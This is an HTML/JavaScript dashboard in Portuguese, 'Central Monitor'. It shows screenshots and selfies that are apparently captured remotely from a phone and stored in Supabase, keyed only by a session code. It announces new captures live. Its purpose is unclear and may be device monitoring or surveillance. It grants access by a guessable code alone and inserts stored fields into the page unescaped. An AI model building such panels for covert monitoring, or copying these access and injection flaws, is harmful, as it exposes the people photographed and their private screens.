<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#1a1a2e">
    <title>Central Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #1a1a2e;
            color: #fff;
            min-height: 100vh;
        }
        
        #loginScreen {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-box {
            background: #16213e;
            padding: 30px;
            border-radius: 15px;
            width: 100%;
            max-width: 350px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        
        .login-box h1 {
            text-align: center;
            margin-bottom: 10px;
            color: #00ff88;
        }
        
        .login-box p {
            text-align: center;
            color: #888;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #0f3460;
            border: 2px solid #0f3460;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border 0.3s;
        }
        
        .login-box input:focus {
            border-color: #00ff88;
        }
        
        #btnLogin {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background: #00ff88;
            border: none;
            border-radius: 8px;
            color: #1a1a2e;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .error {
            color: #ff4757;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }
        
        #dashboard {
            display: none;
            padding: 15px;
            padding-bottom: 70px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px 0;
            border-bottom: 1px solid #333;
            position: sticky;
            top: 0;
            background: #1a1a2e;
            z-index: 10;
        }
        
        .header h2 {
            color: #00ff88;
            font-size: 18px;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .live-indicator {
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            animation: piscar 1s infinite;
        }
        
        @keyframes piscar {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        #btnLogout {
            background: #ff4757;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
            font-size: 12px;
        }
        
        .filters {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            position: sticky;
            top: 60px;
            background: #1a1a2e;
            z-index: 10;
            padding: 5px 0;
        }
        
        .filter-btn {
            flex: 1;
            padding: 8px;
            background: #16213e;
            border: 2px solid #333;
            border-radius: 20px;
            color: #888;
            cursor: pointer;
            text-align: center;
            font-size: 14px;
        }
        
        .filter-btn.active {
            background: #00ff88;
            color: #1a1a2e;
            border-color: #00ff88;
        }
        
        .stats {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .stat-box {
            flex: 1;
            background: #16213e;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-box .number {
            font-size: 28px;
            font-weight: bold;
            color: #00ff88;
        }
        
        .stat-box .label {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
        
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
        }
        
        .gallery-item {
            position: relative;
            aspect-ratio: 9/16;
            background: #16213e;
            border-radius: 10px;
            overflow: hidden;
            cursor: pointer;
            border: 2px solid transparent;
            transition: transform 0.2s;
        }
        
        .gallery-item:active {
            transform: scale(0.95);
        }
        
        .gallery-item.selected {
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }
        
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .badge {
            position: absolute;
            top: 5px;
            right: 5px;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        
        .badge-print {
            background: #3742fa;
        }
        
        .badge-selfie {
            background: #ff6348;
        }
        
        .delete-btn {
            position: absolute;
            top: 5px;
            left: 5px;
            width: 30px;
            height: 30px;
            background: rgba(255, 71, 87, 0.9);
            border: none;
            border-radius: 50%;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
        }
        
        .gallery-item.selected .delete-btn {
            display: flex;
        }
        
        .time {
            position: absolute;
            bottom: 5px;
            left: 5px;
            right: 5px;
            background: rgba(0,0,0,0.8);
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 10px;
            text-align: center;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px 20px;
            color: #555;
            grid-column: 1 / -1;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #888;
            grid-column: 1 / -1;
        }
        
        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #16213e;
            padding: 10px;
            display: flex;
            gap: 10px;
            z-index: 100;
        }
        
        .bottom-bar button {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }
        
        #btnSelectMode {
            background: #3742fa;
        }
        
        #btnSelectMode.active {
            background: #5352ed;
        }
        
        #btnDeleteSelected {
            background: #ff6348;
            display: none;
        }
        
        #btnDeleteAll {
            background: #ff4757;
        }
        
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #00ff88;
            color: #1a1a2e;
            padding: 10px 20px;
            border-radius: 20px;
            font-weight: bold;
            z-index: 1000;
            animation: slideDown 0.3s ease;
            display: none;
        }
        
        @keyframes slideDown {
            from { transform: translate(-50%, -100%); }
            to { transform: translate(-50%, 0); }
        }
        
        .new-badge {
            background: #ff6348;
            color: #fff;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 10px;
            margin-left: 5px;
            animation: piscar 1s infinite;
        }
    </style>
</head>
<body>
    <div id="loginScreen">
        <div class="login-box">
            <h1>🔒 Central Monitor</h1>
            <p>Digite o código da sessão</p>
            <input type="text" id="codigoInput" placeholder="Ex: MEUCEL1" autocomplete="off" value="MEUCEL1">
            <button id="btnLogin">Acessar</button>
            <div class="error" id="loginError"></div>
        </div>
    </div>
    
    <div id="dashboard">
        <div class="header">
            <div class="header-left">
                <div class="live-indicator"></div>
                <h2>📱 <span id="sessionCode"></span></h2>
            </div>
            <button id="btnLogout">Sair</button>
        </div>
        
        <div class="filters">
            <div class="filter-btn active" data-filter="all">Todos</div>
            <div class="filter-btn" data-filter="print">📸 Prints</div>
            <div class="filter-btn" data-filter="selfie">🤳 Selfies</div>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="number" id="totalPrints">0</div>
                <div class="label">Screenshots</div>
            </div>
            <div class="stat-box">
                <div class="number" id="totalSelfies">0</div>
                <div class="label">Selfies</div>
            </div>
        </div>
        
        <div id="gallery" class="gallery">
            <div class="loading">Carregando...</div>
        </div>
        
        <div class="bottom-bar">
            <button id="btnSelectMode">☐ Selecionar</button>
            <button id="btnDeleteSelected" style="display:none;">🗑 Apagar (<span id="selectedCount">0</span>)</button>
            <button id="btnDeleteAll">🗑 Tudo</button>
        </div>
    </div>
    
    <div class="toast" id="toast"></div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        (function() {
            const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
            const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
            
            const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
            
            let currentSession = '';
            let allCaptures = [];
            let selectedIds = new Set();
            let selectMode = false;
            let currentFilter = 'all';
            let realtimeSubscription = null;
            let lastCaptureCount = 0;
            
            const loginScreen = document.getElementById('loginScreen');
            const dashboard = document.getElementById('dashboard');
            const codigoInput = document.getElementById('codigoInput');
            const loginError = document.getElementById('loginError');
            const sessionCodeEl = document.getElementById('sessionCode');
            const gallery = document.getElementById('gallery');
            const btnSelectMode = document.getElementById('btnSelectMode');
            const btnDeleteSelected = document.getElementById('btnDeleteSelected');
            const btnDeleteAll = document.getElementById('btnDeleteAll');
            const btnLogin = document.getElementById('btnLogin');
            const btnLogout = document.getElementById('btnLogout');
            const totalPrints = document.getElementById('totalPrints');
            const totalSelfies = document.getElementById('totalSelfies');
            const selectedCount = document.getElementById('selectedCount');
            const toast = document.getElementById('toast');
            
            function showToast(msg) {
                toast.textContent = msg;
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                }, 2000);
            }
            
            function login() {
                const codigo = codigoInput.value.trim().toUpperCase();
                
                if (!codigo) {
                    loginError.textContent = 'Digite o código!';
                    return;
                }
                
                currentSession = codigo;
                loginScreen.style.display = 'none';
                dashboard.style.display = 'block';
                sessionCodeEl.textContent = codigo;
                
                loadCaptures();
                subscribeRealtime();
            }
            
            function logout() {
                currentSession = '';
                allCaptures = [];
                selectedIds.clear();
                selectMode = false;
                
                loginScreen.style.display = 'flex';
                dashboard.style.display = 'none';
                codigoInput.value = 'MEUCEL1';
                loginError.textContent = '';
                
                if (realtimeSubscription) {
                    realtimeSubscription.unsubscribe();
                    realtimeSubscription = null;
                }
                
                updateUI();
            }
            
            async function loadCaptures() {
                try {
                    const { data, error } = await supabaseClient
                        .from('captures')
                        .select('*')
                        .eq('codigo_sessao', currentSession)
                        .order('created_at', { ascending: false });
                    
                    if (error) throw error;
                    
                    allCaptures = data || [];
                    lastCaptureCount = allCaptures.length;
                    updateUI();
                } catch (error) {
                    console.error('Erro ao carregar:', error);
                }
            }
            
            function subscribeRealtime() {
                if (realtimeSubscription) {
                    realtimeSubscription.unsubscribe();
                }
                
                realtimeSubscription = supabaseClient
                    .channel('captures-changes')
                    .on('postgres_changes', {
                        event: '*',
                        schema: 'public',
                        table: 'captures',
                        filter: `codigo_sessao=eq.${currentSession}`
                    }, (payload) => {
                        if (payload.eventType === 'INSERT') {
                            allCaptures.unshift(payload.new);
                            showToast('📸 Nova captura!');
                            // Vibração se disponível
                            if (navigator.vibrate) {
                                navigator.vibrate(200);
                            }
                        } else if (payload.eventType === 'DELETE') {
                            allCaptures = allCaptures.filter(c => c.id !== payload.old.id);
                            selectedIds.delete(payload.old.id);
                        }
                        
                        if (allCaptures.length > lastCaptureCount) {
                            lastCaptureCount = allCaptures.length;
                        }
                        
                        updateUI();
                    })
                    .subscribe();
            }
            
            function updateUI() {
                let filtered = allCaptures;
                
                if (currentFilter === 'print') {
                    filtered = allCaptures.filter(c => c.tipo === 'print');
                } else if (currentFilter === 'selfie') {
                    filtered = allCaptures.filter(c => c.tipo === 'selfie');
                }
                
                totalPrints.textContent = allCaptures.filter(c => c.tipo === 'print').length;
                totalSelfies.textContent = allCaptures.filter(c => c.tipo === 'selfie').length;
                
                if (filtered.length === 0) {
                    gallery.innerHTML = '<div class="empty-state">📭 Nenhuma captura ainda</div>';
                } else {
                    gallery.innerHTML = filtered.map((capture, index) => `
                        <div class="gallery-item ${selectedIds.has(capture.id) ? 'selected' : ''}" data-id="${capture.id}">
                            <img src="${capture.url}" alt="${capture.tipo}" loading="lazy">
                            <span class="badge badge-${capture.tipo}">${capture.tipo === 'print' ? '📸' : '🤳'}</span>
                            ${selectMode ? '<button class="delete-btn">' + (selectedIds.has(capture.id) ? '✓' : '○') + '</button>' : ''}
                            <div class="time">${formatDate(capture.created_at)}</div>
                            ${index === 0 && currentFilter === 'all' ? '<span class="new-badge">NOVO</span>' : ''}
                        </div>
                    `).join('');
                    
                    document.querySelectorAll('.gallery-item').forEach(item => {
                        item.addEventListener('click', function(e) {
                            if (e.target.classList.contains('delete-btn')) return;
                            
                            const id = this.dataset.id;
                            if (selectMode) {
                                toggleSelect(id);
                            } else {
                                const capture = allCaptures.find(c => c.id === id);
                                if (capture) window.open(capture.url, '_blank');
                            }
                        });
                        
                        const deleteBtn = item.querySelector('.delete-btn');
                        if (deleteBtn) {
                            deleteBtn.addEventListener('click', function(e) {
                                e.stopPropagation();
                                toggleSelect(item.dataset.id);
                            });
                        }
                    });
                }
                
                btnSelectMode.textContent = selectMode ? '✓ Cancelar' : '☐ Selecionar';
                btnSelectMode.classList.toggle('active', selectMode);
                btnDeleteSelected.style.display = selectMode ? 'block' : 'none';
                selectedCount.textContent = selectedIds.size;
            }
            
            function toggleSelectMode() {
                selectMode = !selectMode;
                if (!selectMode) selectedIds.clear();
                updateUI();
            }
            
            function toggleSelect(id) {
                if (!selectMode) return;
                
                if (selectedIds.has(id)) {
                    selectedIds.delete(id);
                } else {
                    selectedIds.add(id);
                }
                updateUI();
            }
            
            function setFilter(filter) {
                currentFilter = filter;
                document.querySelectorAll('.filter-btn').forEach(btn => {
                    btn.classList.toggle('active', btn.dataset.filter === filter);
                });
                updateUI();
            }
            
            async function deleteSelected() {
                if (selectedIds.size === 0) return;
                
                if (!confirm(`Apagar ${selectedIds.size} captura(s)?`)) return;
                
                for (const id of selectedIds) {
                    const capture = allCaptures.find(c => c.id === id);
                    if (capture) {
                        const filePath = `${currentSession}/${capture.tipo}/${capture.filename}`;
                        await supabaseClient.storage.from('captures').remove([filePath]);
                        await supabaseClient.from('captures').delete().eq('id', id);
                    }
                }
                
                selectedIds.clear();
                selectMode = false;
                showToast('✅ Capturas apagadas!');
                await loadCaptures();
            }
            
            async function deleteAll() {
                if (!confirm(`Apagar TODAS as capturas de ${currentSession}?`)) return;
                
                await supabaseClient.from('captures').delete().eq('codigo_sessao', currentSession);
                
                const folders = ['print', 'selfie'];
                for (const folder of folders) {
                    const { data: files } = await supabaseClient.storage
                        .from('captures')
                        .list(`${currentSession}/${folder}`, { limit: 1000 });
                    
                    if (files && files.length > 0) {
                        const paths = files.map(f => `${currentSession}/${folder}/${f.name}`);
                        await supabaseClient.storage.from('captures').remove(paths);
                    }
                }
                
                selectedIds.clear();
                selectMode = false;
                showToast('🗑 Todas as capturas apagadas!');
                await loadCaptures();
            }
            
            function formatDate(dateString) {
                if (!dateString) return '';
                const date = new Date(dateString);
                const now = new Date();
                const diff = now - date;
                
                if (diff < 10000) return '🔴 Agora';
                if (diff < 60000) return `${Math.floor(diff/1000)}s`;
                if (diff < 3600000) return `${Math.floor(diff/60000)}min`;
                if (diff < 86400000) return `${Math.floor(diff/3600000)}h`;
                
                return date.toLocaleDateString('pt-BR', {
                    day: '2-digit',
                    month: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit'
                });
            }
            
            btnLogin.addEventListener('click', login);
            btnLogout.addEventListener('click', logout);
            btnSelectMode.addEventListener('click', toggleSelectMode);
            btnDeleteSelected.addEventListener('click', deleteSelected);
            btnDeleteAll.addEventListener('click', deleteAll);
            
            codigoInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') login();
            });
            
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    setFilter(this.dataset.filter);
                });
            });
        })();
    </script>
</body>
</html>
